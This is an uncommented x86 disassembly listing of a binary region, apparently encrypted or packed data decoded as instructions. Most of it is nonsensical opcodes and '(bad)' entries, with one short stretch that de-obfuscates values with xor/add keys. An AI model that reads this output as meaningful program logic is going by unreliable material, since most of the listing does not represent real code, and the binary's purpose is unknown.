  4080d7:	or     ah,BYTE PTR [ebp+0x2ee19954]
  4080dd:	int    0xa8
  4080df:	push   ebp
  4080e0:	adc    edi,ecx
  4080e2:	scas   eax,DWORD PTR es:[edi]
  4080e3:	mov    esp,esi
  4080e5:	push   ebp
  4080e6:	adc    eax,0x9e07ac15
  4080eb:	neg    BYTE PTR [ebx-0x3f462360]
  4080f1:	adc    al,0x93
  4080f3:	jecxz  0x408121
  4080f5:	shl    DWORD PTR [edx+ebx*2+0x2e],cl
  4080f9:	and    cl,BYTE PTR [ecx+0x48]
  4080fc:	push   ebp
  4080fd:	retf   0x29b4
  408100:	fmul   DWORD PTR [edx+0xc]
  408103:	jle    0x40809e
  408105:	jb     0x408113
  408107:	gs aam 0xa6
  40810a:	mov    ecx,0x921dad90
  40810f:	data16 hlt 
  408111:	jbe    0x408155
  408113:	add    ah,BYTE PTR [eax+edi*1+0x75]
  408117:	lods   al,BYTE PTR ds:[esi]
  408118:	imul   ecx,DWORD PTR [ebx+0x77],0xea36a71c
  40811f:	outs   dx,BYTE PTR ds:[esi]
  408120:	and    al,0x8b
  408122:	mov    edi,0x7997dd0c
  408127:	pusha  
  408128:	mov    bl,0x92
  40812a:	popf   
  40812b:	mov    cl,0x48
  40812d:	loope  0x4080fd
  40812f:	ins    DWORD PTR es:[edi],dx
  408130:	leave  
  408131:	add    ebp,ecx
  408133:	push   cs
  408134:	jno    0x408147
  408136:	push   ss
  408137:	scas   al,BYTE PTR es:[edi]
  408138:	xchg   edx,eax
  408139:	rcl    DWORD PTR [edi],1
  40813b:	mov    ch,0x19
  40813d:	out    0xd4,eax
  40813f:	rcr    ch,cl
  408141:	cmp    BYTE PTR [esi+eax*4],bl
  408144:	cmc    
  408145:	pop    es
  408146:	retf   0x7623
  408149:	pop    eax
  40814a:	push   eax
  40814b:	lahf   
  40814c:	mov    esp,0x74b1f76a
  408151:	push   ds
  408152:	shl    DWORD PTR [esi+0x32],0xfb
  408156:	outs   dx,BYTE PTR ds:[esi]
  408157:	push   0x8e96cba2
  40815c:	jmp    0xc126d51b
  408161:	ins    DWORD PTR es:[edi],dx
  408162:	and    al,0x7a
  408164:	fist   WORD PTR [edx]
  408166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408167:	ret    
  408168:	imul   ecx,DWORD PTR [esi+eax*2],0x86934026
  40816f:	cmp    bh,bl
  408171:	adc    esi,DWORD PTR [edi+0xa]
  408174:	inc    ebp
  408175:	pusha  
  408176:	mov    edi,0x22da71ab
  40817b:	jge    0x40815f
  40817d:	js     0x40816e
  40817f:	xor    eax,0xe16a89c
  408184:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408185:	jecxz  0x4081c5
  408187:	lock add esi,ebp
  40818a:	not    DWORD PTR [edx+0x48]
  40818d:	in     eax,0xa6
  40818f:	int    0x30
  408191:	mov    eax,0xcb8a0eb
  408196:	(bad)  
  408197:	jg     0x408156
  408199:	(bad)  
  40819a:	adc    BYTE PTR [eax+esi*2-0x52],bl
  40819e:	stos   BYTE PTR es:[edi],al
  40819f:	pop    ss
  4081a0:	mov    cl,0x71
  4081a2:	adc    eax,0xc7a50c98
  4081a7:	mov    ah,0x3
  4081a9:	or     dl,ah
  4081ab:	clc    
  4081ac:	ins    DWORD PTR es:[edi],dx
  4081ad:	jmp    0x40819c
  4081af:	mov    ecx,0x76330f24
  4081b4:	mov    edi,0x5475309f
  4081b9:	mov    dl,0xbd
  4081bb:	mov    dl,0x60
  4081bd:	outs   dx,BYTE PTR ds:[esi]
  4081be:	ja     0x408186
  4081c0:	pop    esp
  4081c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081c2:	cmp    ecx,DWORD PTR [edx+ebx*2]
  4081c5:	out    0x3d,eax
  4081c7:	and    ch,cl
  4081c9:	inc    edx
  4081ca:	add    al,0x5e
  4081cc:	lods   eax,DWORD PTR ds:[esi]
  4081cd:	call   0x127d:0x897aa015
  4081d4:	gs mov edx,0x7f0ee39c
  4081da:	push   ss
  4081db:	stc    
  4081dc:	sar    ah,0x10
  4081df:	and    eax,0xca4fc638
  4081e4:	cdq    
  4081e5:	jne    0x4081da
  4081e7:	mov    ds:0xa46a541d,eax
  4081ec:	push   0x38
  4081ee:	sub    BYTE PTR [ebx+eax*2],bh
  4081f1:	fninit 
  4081f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081f4:	xchg   edx,eax
  4081f5:	push   eax
  4081f6:	jecxz  0x4081ab
  4081f8:	jg     0x408211
  4081fa:	dec    esi
  4081fb:	stos   DWORD PTR es:[edi],eax
  4081fc:	imul   edi,DWORD PTR fs:[eax],0x43bb3e11
  408203:	add    al,0x3c
  408205:	je     0x408257
  408207:	test   al,0x2d
  408209:	pop    ecx
  40820a:	shr    eax,1
  40820c:	or     al,0x8c
  40820e:	pop    eax
  40820f:	push   ebp
  408210:	adc    ebx,ebx
  408212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408213:	sti    
  408214:	nop
  408215:	mov    al,ds:0x6c68861a
  40821a:	cs mov eax,0x846c0cfe
  408220:	pushf  
  408221:	adc    al,0x37
  408223:	aaa    
  408224:	xor    BYTE PTR [edi-0x77],dh
  408227:	out    0x4b,al
  408229:	jnp    0x4081ad
  40822b:	dec    edi
  40822c:	stos   BYTE PTR es:[edi],al
  40822d:	jle    0x4081fe
  40822f:	and    bl,BYTE PTR [esp+eiz*4-0x30]
  408233:	ja     0x4081fd
  408235:	xchg   ecx,eax
  408236:	imul   eax,eax,0xa99c64a1
  40823c:	test   eax,0x66c13762
  408241:	sbb    DWORD PTR [ecx-0x66014067],eax
  408247:	rcr    edx,1
  408249:	imul   ebp,DWORD PTR [ebp+0x4a],0x93d39d4a
  408250:	inc    edi
  408251:	add    edx,edi
  408253:	pop    ebp
  408254:	mov    edi,0x23b940ee
  408259:	dec    ecx
  40825a:	adc    bl,BYTE PTR [ebp-0x40bdc80]
  408260:	mov    edi,0x39ceb93d
  408265:	xchg   ebx,eax
  408266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408267:	dec    esp
  408268:	enter  0xb4f5,0x6a
  40826c:	out    0x0,al
  40826e:	or     ecx,ecx
  408270:	mov    ecx,0xde2581b
  408275:	in     al,0xa7
  408277:	dec    ecx
  408278:	pop    eax
  408279:	je     0x408225
  40827b:	mov    ecx,0xddff037d
  408280:	sbb    ecx,DWORD PTR [edx]
  408282:	aaa    
  408283:	adc    dl,BYTE PTR [ecx]
  408285:	adc    eax,0x5cebc825
  40828a:	aas    
  40828b:	mov    ds:0x12ff7600,eax
  408290:	sub    DWORD PTR [edx-0x12],ebp
  408293:	xor    DWORD PTR ds:[ecx+0x6048466f],ebp
  40829a:	addr16 add eax,0xa8ccea1a
  4082a0:	dec    edx
  4082a1:	cmp    eax,0x1f8280a2
  4082a6:	frstor [edi+0x58093726]
  4082ac:	frstor [edi]
  4082ae:	popf   
  4082af:	inc    ebp
  4082b0:	mov    esp,0x3f6062e1
  4082b5:	mov    ch,0xef
  4082b7:	scas   eax,DWORD PTR es:[edi]
  4082b8:	xchg   ecx,eax
  4082b9:	les    eax,FWORD PTR [ebx-0x3]
  4082bc:	push   cs
  4082bd:	mov    WORD PTR ds:0x86c6c0f5,cs
  4082c3:	xor    edx,DWORD PTR [edx]
  4082c5:	icebp  
  4082c6:	ss ins BYTE PTR es:[edi],dx
  4082c8:	mov    ds:0xc6b5f650,eax
  4082cd:	adc    eax,0x10c4a090
  4082d2:	push   ss
  4082d3:	out    0xf9,eax
  4082d5:	mov    eax,DWORD PTR [ebp-0x38]
  4082d8:	xor    eax,esi
  4082da:	add    eax,edi
  4082dc:	mov    DWORD PTR [ebp-0x8],eax
  4082df:	mov    DWORD PTR [ebp-0x2c],0xf89c8590
  4082e6:	mov    DWORD PTR [ebp-0x44],0xf89c85bf
  4082ed:	mov    eax,DWORD PTR [ebp-0x38]
  4082f0:	mov    edx,DWORD PTR [ebp-0x14]
  4082f3:	xor    eax,esi
  4082f5:	add    eax,edi
  4082f7:	cmp    edx,eax
  4082f9:	je     0x40cbaa
  4082ff:	mov    eax,DWORD PTR [ebp-0x20]
  408302:	xor    eax,esi
  408304:	mov    edx,0xffcd8d14
  408309:	sub    edx,eax
  40830b:	add    edx,DWORD PTR [ebp-0x14]
  40830e:	mov    eax,DWORD PTR [ebp-0x20]
  408311:	mov    ebx,DWORD PTR [ebp-0x10]
  408314:	xor    eax,esi
  408316:	add    eax,edi
  408318:	imul   eax,ebx
  40831b:	cmp    eax,edx
  40831d:	ja     0x40cba7
  408323:	jmp    0x40a67f
  408328:	iret   
  408329:	xor    ecx,DWORD PTR [esi-0x3c7071c1]
  40832f:	add    DWORD PTR [ebx],0xfffffff7
  408332:	adc    edx,ebx
  408334:	ins    BYTE PTR es:[edi],dx
  408335:	ds or  eax,0x7a15b991
  40833b:	jp     0x408378
  40833d:	pop    edi
  40833e:	jp     0x4083ba
  408340:	or     al,0xc3
  408342:	(bad)  
  408346:	cmp    ebx,edx
  408348:	les    edx,FWORD PTR [eax]
  40834a:	adc    al,BYTE PTR [edi+eax*2-0x29699b35]
  408351:	jecxz  0x408324
  408353:	or     BYTE PTR [ebx-0x4e4b57b8],dh
  408359:	and    bl,bh
  40835b:	mov    dh,0x83
  40835d:	add    ebx,ebx
  40835f:	pop    esp
  408360:	mov    BYTE PTR [edx-0x5cf10f80],ah
  408366:	dec    eax
  408367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408368:	fwait
  408369:	adc    al,0xe3
  40836b:	sbb    ebp,DWORD PTR [edi]
  40836d:	pushf  
  40836e:	pop    esi
  40836f:	test   ah,ch
  408371:	sbb    bh,BYTE PTR [eax-0x4e1ef179]
  408377:	nop
  408378:	ret    0xb2e2
  40837b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40837c:	repnz push eax
  40837e:	mov    ecx,DWORD PTR [ecx]
  408380:	fprem  
  408382:	mov    ch,0xae
  408384:	sti    
  408385:	sub    BYTE PTR [esi],bl
  408387:	ja     0x40834f
  408389:	stos   DWORD PTR es:[edi],eax
  40838a:	cmp    DWORD PTR [eax],0x5fdf3e75
  408390:	and    eax,0x1004d276
  408395:	(bad)  
  408396:	mov    edi,0x3b204944
  40839b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40839c:	mov    eax,0x4481179c
  4083a1:	jo     0x4083fe
  4083a3:	mov    bh,0xf6
  4083a5:	rcl    BYTE PTR [edx],cl
  4083a7:	ins    DWORD PTR es:[edi],dx
  4083a8:	pop    edi
  4083a9:	scas   al,BYTE PTR es:[edi]
  4083aa:	test   DWORD PTR [edx-0x7],esi
  4083ad:	xchg   DWORD PTR [esi],ebx
  4083af:	dec    ebx
  4083b0:	or     al,0xee
  4083b2:	or     edx,DWORD PTR [ebx+edi*4+0x95cdb9e]
  4083b9:	sub    eax,0x3deb1038
  4083be:	mov    ecx,0xfe11acfb
  4083c3:	pop    eax
  4083c4:	ss xchg ecx,eax
  4083c6:	xchg   ebx,eax
  4083c7:	std    
  4083c8:	xlat   BYTE PTR ds:[ebx]
  4083c9:	mov    cl,0x46
  4083cb:	add    esp,DWORD PTR [ecx]
  4083cd:	or     DWORD PTR [eax-0x32],ebp
  4083d0:	std    
  4083d1:	lds    ebp,FWORD PTR [eax-0x20fba9c]
  4083d7:	and    edx,ebp
  4083d9:	dec    esi
  4083da:	sahf   
  4083db:	inc    ebx
  4083dc:	jmp    0x4b9d:0xebf9cae3
  4083e3:	int    0xc
  4083e5:	jmp    0x9ecdb9ab
  4083ea:	and    eax,0xdc82ceec
  4083ef:	outs   dx,DWORD PTR ds:[esi]
  4083f0:	shl    ah,1
  4083f2:	mov    edi,0xc4f6fe0d
  4083f7:	jae    0x408456
  4083f9:	inc    esp
  4083fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083fb:	mov    ebp,esi
  4083fd:	mov    ah,0x1d
  4083ff:	sub    eax,0x270ce498
  408404:	dec    esp
  408405:	and    al,0xd
  408407:	mov    cl,BYTE PTR [edx+0x3621349f]
  40840d:	adc    ah,BYTE PTR [ebp+0x56bae5a4]
  408413:	arpl   sp,bx
  408415:	pop    edi
  408416:	dec    edx
  408417:	pop    ebp
  408418:	ret    
  408419:	cdq    
  40841a:	inc    esp
  40841b:	je     0x408481
  40841d:	test   eax,edi
  40841f:	les    ecx,FWORD PTR [esi+ebx*4+0x24]
  408423:	hlt    
  408424:	(bad)  
  408425:	dec    edi
  408426:	jp     0x408430
  408428:	mov    esp,0xebb3902f
  40842d:	xchg   ecx,eax
  40842e:	ficomp DWORD PTR [edi]
  408430:	add    eax,esp
  408432:	fsubr  DWORD PTR [ebx+0x51]
  408435:	(bad)  
  408436:	in     al,dx
  408437:	lahf   
  408438:	jge    0x40847b
  40843a:	(bad)  
  40843b:	jae    0x408422
  40843d:	jle    0x408437
  40843f:	jmp    0xd12e0dac
  408444:	loopne 0x4084a1
  408446:	cmp    dh,BYTE PTR [esi+0x76]
  408449:	lds    edx,FWORD PTR [edi]
  40844b:	sub    eax,0xe3e535fd
  408450:	mov    bl,0x82
  408452:	cmp    al,0xe3
  408454:	(bad)  
  408455:	jmp    0x408496
  408457:	ret    
  408458:	and    BYTE PTR [ecx+0x3d],0x89
  40845c:	cwde   
  40845d:	outs   dx,DWORD PTR ds:[esi]
  40845e:	jbe    0x40843d
  408460:	adc    eax,0xd7556d68
  408465:	scas   eax,DWORD PTR es:[edi]
  408466:	and    DWORD PTR [ebp+0x73],ecx
  408469:	ins    BYTE PTR es:[edi],dx
  40846a:	daa    
  40846b:	add    DWORD PTR [edi+0x6d],ecx
  40846e:	xchg   ebx,ebx
  408470:	push   ebx
  408471:	in     al,dx
  408472:	mov    ds:0x6434a1f8,eax
  408477:	dec    edx
  408478:	adc    eax,edx
  40847a:	nop
  40847b:	xchg   ebp,eax
  40847c:	dec    ebx
  40847d:	mov    ebx,0x43162491
  408482:	lahf   
  408483:	inc    ebp
  408484:	mov    ebx,0xdbcc166a
  408489:	push   ebp
  40848a:	mov    ds:0x61c6a15a,al
  40848f:	imul   ebx,DWORD PTR [edi],0x35
  408492:	gs aad 0x70
  408495:	jb     0x4084dd
  408497:	ins    BYTE PTR es:[edi],dx
  408498:	xor    BYTE PTR [ebp-0xa4c324d],cl
  40849e:	pop    eax
  40849f:	pop    ebx
  4084a0:	jns    0x40851a
  4084a2:	fucom  st(6)
  4084a4:	in     eax,dx
  4084a5:	push   ecx
  4084a6:	sub    DWORD PTR [ebp-0x2a427bfe],esp
  4084ac:	xor    eax,0x1464edb1
  4084b1:	cdq    
  4084b2:	xchg   edi,eax
  4084b3:	push   esp
  4084b4:	aad    0xef
  4084b6:	push   ecx
  4084b7:	lods   al,BYTE PTR ds:[esi]
  4084b8:	mov    ah,0xb3
  4084ba:	inc    edx
  4084bb:	sub    esi,ebx
  4084bd:	in     al,dx
  4084be:	adc    ch,ah
  4084c0:	dec    edx
  4084c1:	mov    ecx,0xe3adfae3
  4084c6:	fiadd  WORD PTR [edx+0x6a081756]
  4084cc:	cdq    
  4084cd:	xchg   edi,eax
  4084ce:	arpl   WORD PTR [esp+ebx*8],cx
  4084d1:	sbb    ch,dl
  4084d3:	push   ebx
  4084d4:	pop    ds
  4084d5:	sbb    al,0x38
  4084d7:	arpl   WORD PTR [edi+0x433e62a4],bp
  4084dd:	jnp    0x4084eb
  4084df:	sub    ebx,DWORD PTR [ebp+0x1]
  4084e2:	int    0x3d
  4084e4:	imul   esi,DWORD PTR [ebx+0x3f1ffeda],0xb55a398c
  4084ee:	int    0xf4
  4084f0:	push   0xffffffe9
  4084f2:	arpl   WORD PTR [ebp-0x70],dx
  4084f5:	inc    eax
  4084f6:	lods   al,BYTE PTR ds:[esi]
  4084f7:	jo     0x4084f1
  4084f9:	cld    
  4084fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084fb:	repz scas al,BYTE PTR es:[edi]
  4084fd:	or     edx,ecx
  4084ff:	daa    
  408500:	inc    ebp
  408501:	int    0x9
  408503:	push   ebx
  408504:	push   edx
  408505:	jo     0x4084a4
  408507:	push   ecx
  408508:	fstp   QWORD PTR [ebx+0x13]
  40850b:	pop    es
  40850c:	lock out 0x8,eax
  40850f:	out    dx,eax
  408510:	xchg   ecx,eax
  408511:	push   es
  408512:	xchg   BYTE PTR [edx-0x47],bl
  408515:	mov    al,0x4d
  408517:	adc    al,0x63
  408519:	(bad)  
  40851a:	loope  0x408568
  40851c:	xor    ah,cl
  40851e:	fiadd  DWORD PTR [ebx-0x1d]
  408521:	mov    ds:0xa0cfbc62,al
  408526:	cmovg  esp,ebx
  408529:	or     cl,BYTE PTR [ebx+edx*2-0x12]
  40852d:	inc    ebx
  40852e:	dec    esi
  40852f:	inc    edx
  408530:	jo     0x408598
  408532:	xor    esi,DWORD PTR [edi]
  408534:	shl    DWORD PTR [edx+0x24f5d78c],0xd5
  40853b:	cmp    DWORD PTR [edx],ebx
  40853d:	and    DWORD PTR [ebx+esi*4-0x17],ebp
  408541:	add    dl,BYTE PTR [ebp-0x69]
  408544:	mov    dl,0x29
  408546:	xchg   esi,edx
  408548:	loopne 0x4084dd
  40854a:	mov    al,0xf4
  40854c:	jnp    0x408592
  40854e:	loop   0x4084f3
  408550:	xor    al,dh
  408552:	pop    es
  408553:	push   cs
  408554:	jge    0x40853b
  408556:	sar    BYTE PTR [edx+0x2b],cl
  408559:	scas   eax,DWORD PTR es:[edi]
  40855a:	fwait
  40855b:	dec    edx
  40855c:	inc    ebx
  40855d:	int3   
  40855e:	mov    edi,0xf1dc5fb4
  408563:	lods   al,BYTE PTR ds:[esi]
  408564:	xor    eax,0xbceb80e5
  408569:	out    dx,eax
  40856a:	clc    
  40856b:	arpl   WORD PTR [ebp-0x69],dx
  40856e:	retf   
  40856f:	icebp  
  408570:	xor    bh,BYTE PTR [eax+0x35097fd6]
  408576:	push   eax
  408577:	mov    ecx,0xcdf3a695
  40857c:	inc    edi
  40857d:	aad    0xd2
  40857f:	(bad)  [ebp+0xd31e668]
  408585:	test   DWORD PTR [edx],eax
  408587:	pop    ds
  408588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408589:	xchg   esi,eax
  40858a:	(bad)  
  40858b:	fcom   DWORD PTR [edx]
  40858d:	mov    es,WORD PTR [ebp+0x13]
  408590:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408591:	std    
  408592:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408593:	xor    al,0xe9
  408595:	adc    DWORD PTR [esi],0xfffffffb
  408598:	mov    eax,0xb2884bc8
  40859d:	push   ebp
  40859e:	push   esi
  40859f:	aaa    
  4085a0:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4085a2:	shl    BYTE PTR [ecx+0x1955dcca],0xf
  4085a9:	out    0xa2,al
  4085ab:	ret    0x87c5
  4085ae:	adc    eax,0xbbf0852e
  4085b3:	sbb    DWORD PTR [edx+0x6694e020],esp
  4085b9:	mov    dl,bh
  4085bb:	cdq    
  4085bc:	fwait
  4085bd:	push   0x8d32222a
  4085c2:	xor    bh,BYTE PTR [ebx]
  4085c4:	push   ebp
  4085c5:	es inc ebp
  4085c7:	mov    al,0xd0
  4085c9:	sbb    BYTE PTR [esi+edi*4-0x79978f15],dl
  4085d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085d1:	sub    BYTE PTR [esi+eax*1+0xd],0x78
  4085d6:	cmc    
  4085d7:	jne    0x4085c8
  4085d9:	je     0x40857d
  4085db:	or     eax,0x5b592c34
  4085e0:	(bad)  
  4085e1:	xchg   esp,eax
  4085e2:	sbb    eax,0x53b73afa
  4085e7:	aad    0xc9
  4085e9:	push   edi
  4085ea:	and    al,BYTE PTR [edi]
  4085ec:	fcmovnbe st,st(6)
  4085ee:	push   0xffffffa6
  4085f0:	dec    ecx
  4085f1:	nop
  4085f2:	gs fs sub al,0x20
  4085f6:	(bad)  
  4085f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085f8:	fild   DWORD PTR [esi+edx*2+0x5823f53]
  4085ff:	fdivp  st(0),st
  408601:	clc    
  408602:	cdq    
  408603:	add    BYTE PTR [ebp-0x534b2d83],0x73
  40860a:	test   al,0x98
  40860c:	sub    bh,BYTE PTR [esi+0x20]
  40860f:	es xchg ebx,eax
  408611:	loope  0x408622
  408613:	adc    eax,DWORD PTR [esi+edi*2-0x60]
  408617:	mov    bh,0x47
  408619:	jmp    0xa5773e0e
  40861e:	dec    ebx
  40861f:	sti    
  408620:	popa   
  408621:	out    0x32,eax
  408623:	mov    DWORD PTR [edx+0x402eed4],esp
  408629:	adc    eax,0x377712e2
  40862e:	or     al,0x53
  408630:	popf   
  408631:	sub    eax,0xd9318252
  408636:	mov    eax,ds:0xaf860fe0
  40863b:	or     BYTE PTR [ecx+0x14],0x2c
  40863f:	xchg   esi,eax
  408640:	fabs   
  408642:	mov    bh,0x71
  408644:	in     eax,dx
  408645:	mov    esp,0xeff756c9
  40864a:	rcr    BYTE PTR [eax],1
  40864c:	xor    esp,DWORD PTR fs:[edx]
  40864f:	(bad)  
  408650:	cli    
  408651:	sbb    BYTE PTR [edx+0x49],cl
  408654:	lods   eax,DWORD PTR ds:[esi]
  408655:	jbe    0x408684
  408657:	aas    
  408658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408659:	out    dx,al
  40865a:	mov    eax,0x4ed8d575
  40865f:	mov    DWORD PTR [ebp+0x3f7f35f2],ebx
  408665:	shl    DWORD PTR [ebx+0x5000f4e1],0x3f
  40866c:	dec    ecx
  40866d:	arpl   WORD PTR [edx+0x67],bp
  408670:	adc    ah,BYTE PTR [ebx]
  408672:	loopne 0x408616
  408674:	mov    ecx,0xa63d2943
  408679:	jns    0x4086c8
  40867b:	call   0x10c631d4
  408680:	add    BYTE PTR [ebx],cl
  408682:	and    edi,DWORD PTR [eax+0x7f33a142]
  408688:	pop    ecx
  408689:	retf   
  40868a:	and    ecx,edi
  40868c:	sub    DWORD PTR ds:0xd4e76e0f,esp
  408692:	add    BYTE PTR [ebx+0x6b61270c],ah
  408698:	xchg   ebx,eax
  408699:	or     edx,ebp
  40869b:	clc    
  40869c:	xor    DWORD PTR [esi+ecx*2+0x7127aae8],esp
  4086a3:	fdiv   DWORD PTR [ebp-0x44]
  4086a6:	adc    ch,BYTE PTR [esi-0x3f]
  4086a9:	lds    edx,FWORD PTR [esi]
  4086ab:	cmp    al,0x46
  4086ad:	pop    es
  4086ae:	sub    BYTE PTR [edi-0x53],ch
  4086b1:	inc    eax
  4086b2:	mov    esp,0x4b8775b7
  4086b7:	or     DWORD PTR [ebp-0x2b538d3],edx
  4086bd:	and    DWORD PTR [edx+0x2d],edx
  4086c0:	cmp    BYTE PTR [edx-0x7a50602a],0x66
  4086c7:	pop    esi
  4086c8:	test   eax,0x7244f7ac
  4086cd:	push   cs
  4086ce:	push   0x37
  4086d0:	int    0x80
  4086d2:	cmp    dh,BYTE PTR [ebp+0x656295fa]
  4086d8:	lea    esp,[edx+0x366ce093]
  4086de:	jle    0x4086b0
  4086e0:	xchg   edx,eax
  4086e1:	jno    0x408738
  4086e3:	jmp    FWORD PTR [edx+0x2c]
  4086e6:	sti    
  4086e7:	sub    cl,bl
  4086e9:	push   ebp
  4086ea:	push   0xd2593663
  4086ef:	bound  ebp,QWORD PTR [esi+0x71]
  4086f2:	cmc    
  4086f3:	adc    dh,bl
  4086f5:	je     0x4086a0
  4086f7:	add    al,0xfe
  4086f9:	xor    ebx,esi
  4086fb:	imul   esi,DWORD PTR [ebx+esi*4-0x1d],0xfffffff4
  408700:	pop    ds
  408701:	popa   
  408702:	lds    esi,FWORD PTR [edx-0x2bfb279d]
  408708:	mov    gs,WORD PTR [ebx]
  40870a:	mov    ecx,0x694e3f65
  40870f:	int    0x5b
  408711:	mov    ds:0x26c15afc,al
  408716:	pop    ds
  408717:	or     eax,0xce6891d4
  40871c:	loopne 0x4086eb
  40871e:	pop    edi
  40871f:	jp     0x4086fa
  408721:	or     esp,DWORD PTR [ecx]
  408723:	mov    dl,0xf1
  408725:	push   ecx
  408726:	and    edi,DWORD PTR [ebx+ebp*1]
  408729:	jmp    0xd1d7:0xef3eee7a
  408730:	ret    
  408731:	jg     0x4086d7
  408733:	test   BYTE PTR [esi],0xa3
  408736:	aad    0x55
  408738:	xor    DWORD PTR [edi-0x4dd717f8],0xe070835
  408742:	les    ebx,FWORD PTR [ebp+0x3c]
  408745:	test   DWORD PTR [eax],esp
  408747:	aam    0xaf
  408749:	push   eax
  40874a:	mov    DWORD PTR [edi],edx
  40874c:	aaa    
  40874d:	pusha  
  40874e:	lahf   
  40874f:	mov    BYTE PTR [edx+0x57],ah
  408752:	xchg   BYTE PTR [ecx+0x3a26fc3c],bh
  408758:	stc    
  408759:	arpl   WORD PTR [eax-0x53],dx
  40875c:	xchg   esi,eax
  40875d:	xchg   edi,eax
  40875e:	scas   al,BYTE PTR es:[edi]
  40875f:	jbe    0x40874b
  408761:	jl     0x408734
  408763:	jmp    0xe1a32e0d
  408768:	or     DWORD PTR [esi+0x75],ebx
  40876b:	mov    ?,WORD PTR [edx+0x7]
  40876e:	sbb    BYTE PTR [edx],cl
  408770:	clc    
  408771:	dec    esp
  408772:	jge    0x4087f3
  408774:	mov    eax,0x950b8e38
  408779:	lods   al,BYTE PTR ds:[esi]
  40877a:	ja     0x40872a
  40877c:	mov    edx,0x2862e449
  408781:	adc    eax,DWORD PTR [edi-0x47bc8a49]
  408787:	inc    edx
  408788:	neg    BYTE PTR [ecx-0x10]
  40878b:	popf   
  40878c:	push   es
  40878d:	add    eax,0xedda60e0
  408792:	and    eax,0xac818cdb
  408797:	dec    edx
  408798:	xchg   edi,eax
  408799:	or     esp,esp
  40879b:	scas   al,BYTE PTR es:[edi]
  40879c:	push   0x310bda9e
  4087a1:	outs   dx,DWORD PTR ds:[esi]
  4087a2:	dec    ebx
  4087a3:	xor    esp,DWORD PTR [ecx+0x1b]
  4087a6:	pop    ss
  4087a7:	jae    0x408774
  4087a9:	mov    dl,0x33
  4087ab:	mov    edx,0xfbb276d9
  4087b0:	jb     0x408774
  4087b2:	dec    esi
  4087b3:	(bad)  
  4087b4:	out    0x14,al
  4087b6:	add    edi,DWORD PTR [eax+ebx*8-0x432045c7]
  4087bd:	lahf   
  4087be:	in     al,0xbd
  4087c0:	leave  
  4087c1:	and    DWORD PTR [esi+0x54],edx
  4087c4:	add    eax,0x411982bc
  4087c9:	dec    edx
  4087ca:	repz pop ebp
  4087cc:	cmp    BYTE PTR [ebp+0x48],0xd
  4087d0:	jne    0x408773
  4087d2:	jp     0x4087e8
  4087d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087d5:	ret    0x7d7a
  4087d8:	addr16 inc edx
  4087da:	sub    BYTE PTR [ecx],ch
  4087dc:	test   al,0x85
  4087de:	jno    0x408847
  4087e0:	inc    esi
  4087e1:	loop   0x4087bc
  4087e3:	and    ch,ch
  4087e5:	or     BYTE PTR [edi-0x76],cl
  4087e8:	outs   dx,BYTE PTR ds:[esi]
  4087e9:	pop    edi
  4087ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087eb:	cmp    eax,0x30a9d4a5
  4087f0:	(bad)  
  4087f1:	std    
  4087f2:	pop    edi
  4087f3:	dec    ebp
  4087f4:	lock sub DWORD PTR [edi+0x3d],edx
  4087f8:	jno    0x408872
  4087fa:	mov    bl,0xc4
  4087fc:	popa   
  4087fd:	add    dl,BYTE PTR [eax+0x3b]
  408800:	aas    
  408801:	call   0xeb03a142
  408806:	scas   eax,DWORD PTR es:[edi]
  408807:	hlt    
  408808:	retf   0xf472
  40880b:	pop    ss
  40880c:	jge    0x408877
  40880e:	enter  0x9fa3,0x6d
  408812:	jnp    0x40886d
  408814:	xor    eax,0x226fdad1
  408819:	pop    ds
  40881a:	push   ebx
  40881b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40881c:	sbb    BYTE PTR [esi],bl
  40881e:	and    BYTE PTR [ecx-0x3e],dh
  408821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408822:	retf   0x7572
  408825:	arpl   WORD PTR [esi-0x36],sp
  408828:	or     DWORD PTR [ebx-0x4d00ba17],ebp
  40882e:	lds    esi,FWORD PTR [edi+0x10118980]
  408834:	dec    ecx
  408835:	add    ah,BYTE PTR [bp+di]
  408838:	addr16 mov esi,0x22ff3b47
  40883e:	mov    WORD PTR [ecx],gs
  408840:	or     DWORD PTR [si],eax
  408843:	pusha  
  408844:	xchg   bh,dl
  408846:	dec    edx
  408848:	pop    edx
  408849:	cs push eax
  40884b:	xor    al,0x4b
  40884d:	repz mov dh,0x42
  408850:	jmp    0x408866
  408852:	jg     0x408826
  408854:	ss jo  0x408891
  408857:	jbe    0x4088c0
  408859:	sub    edx,DWORD PTR [edi+0x59]
  40885c:	jle    0x4088d0
  40885e:	test   BYTE PTR [eax+0x30],ah
  408861:	jb     0x408865
  408863:	aad    0x6e
  408865:	xchg   edx,eax
  408866:	jnp    0x4088bb
  408868:	ss inc ebp
  40886a:	loop   0x4087ee
  40886c:	(bad)  
  40886d:	add    edi,ebp
  40886f:	sbb    edx,esp
  408871:	addr16 jmp 0x40886d
  408874:	jle    0x40888a
  408876:	aam    0x86
  408878:	popa   
  408879:	xchg   ebp,eax
  40887a:	mov    dl,0x58
  40887c:	fmul   QWORD PTR [eax]
  40887e:	daa    
  40887f:	and    BYTE PTR [ebp+0x2e],bh
  408882:	int3   
